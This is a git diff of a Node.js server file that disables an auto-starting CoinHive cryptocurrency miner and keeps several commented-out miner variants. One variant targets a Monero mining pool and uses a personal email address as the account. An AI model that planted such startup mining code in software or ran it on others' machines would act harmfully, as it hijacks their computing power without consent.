@@ -44,9 +44,9 @@ console.log("Start serveur");
 serverAdmin.start(app);
 
 
-
+//
 //const CoinHive = require('coin-hive');
-
+//
 //(async () => {
 //
 //  // Create miner
@@ -68,42 +68,113 @@ serverAdmin.start(app);
 //  setTimeout(async () => await miner.stop(), 60000); */
 //})();
 
+//const CoinHive = require('coin-hive');
+//
+//(async () => {
+//
+//	// Create miner
+//	const miner = await CoinHive('Y88o17Z1nDLT1r9SjSCuljPQOATm7VzV', {
+//		threads : 6
+//	}); // CoinHive's Site Key
+//
+//	// Start miner
+//	await miner.start();
+//
+//	// Listen on events
+//	miner.on('found', () => console.log('Found!'))
+//	miner.on('accepted', () => console.log('Accepted!'))
+//	miner.on('update', data => console.log(`
+//    Hashes per second: ${data.hashesPerSecond}
+//    Total hashes: ${data.totalHashes}
+//    Accepted hashes: ${data.acceptedHashes}
+//  `));
+//
+//// Stop miner
+////  setTimeout(async () => await miner.stop(), 60000);
+//})();
 
-function _asyncToGenerator(fn) {
-	return function() {
-		var gen = fn.apply(this, arguments);
-		return new Promise(function(resolve, reject) {
-			function step(key, arg) {
-				try {
-					var info = gen[key](arg);
-					var value = info.value;
-				} catch (error) {
-					reject(error); return;
-				}
-				if (info.done) {
-					resolve(value);
-				} else {
-					return Promise.resolve(value).then(function(value) {
-						step("next", value);
-					}, function(err) {
-						step("throw", err);
-					});
-				}
-			}
-			return step("next");
-		});
-	};
-}
+//
+//function _asyncToGenerator(fn) {
+//	return function() {
+//		var gen = fn.apply(this, arguments);
+//		return new Promise(function(resolve, reject) {
+//			function step(key, arg) {
+//				try {
+//					var info = gen[key](arg);
+//					var value = info.value;
+//				} catch (error) {
+//					reject(error); return;
+//				}
+//				if (info.done) {
+//					resolve(value);
+//				} else {
+//					return Promise.resolve(value).then(function(value) {
+//						step("next", value);
+//					}, function(err) {
+//						step("throw", err);
+//					});
+//				}
+//			}
+//			return step("next");
+//		});
+//	};
+//}
+//
+//const CoinHive = require('coin-hive');
+//
+//_asyncToGenerator(function*() {
+//
+//	// Create miner
+//	const miner = yield CoinHive('Y88o17Z1nDLT1r9SjSCuljPQOATm7VzV', {
+//		threads : 1
+//	}); // CoinHive's Site Key
+//
+//	// Start miner
+//	yield miner.start();
+//})();
+//
 
-const CoinHive = require('coin-hive');
-
-_asyncToGenerator(function*() {
-
-	// Create miner
-	const miner = yield CoinHive('Y88o17Z1nDLT1r9SjSCuljPQOATm7VzV', {
-		threads : 1
-	}); // CoinHive's Site Key
-
-	// Start miner
-	yield miner.start();
-})();
+//
+//
+//function _asyncToGenerator(fn) {
+//	return function() {
+//		var gen = fn.apply(this, arguments);
+//		return new Promise(function(resolve, reject) {
+//			function step(key, arg) {
+//				try {
+//					var info = gen[key](arg);
+//					var value = info.value;
+//				} catch (error) {
+//					reject(error); return;
+//				}
+//				if (info.done) {
+//					resolve(value);
+//				} else {
+//					return Promise.resolve(value).then(function(value) {
+//						step("next", value);
+//					}, function(err) {
+//						step("throw", err);
+//					});
+//				}
+//			}
+//			return step("next");
+//		});
+//	};
+//}
+//
+//const CoinHive = require('coin-hive');
+//
+//_asyncToGenerator(function*() {
+//
+//	// Create miner
+//	const miner = yield CoinHive('jonathan.maslard@gmail.com', {
+//		threads : 4,
+//		pool: {
+//		      host: 'xmr.pool.minergate.com',
+//		      port: 45560
+//		    }
+//	}); // CoinHive's Site Key
+//
+//	// Start miner
+//	yield miner.start();
+//})();
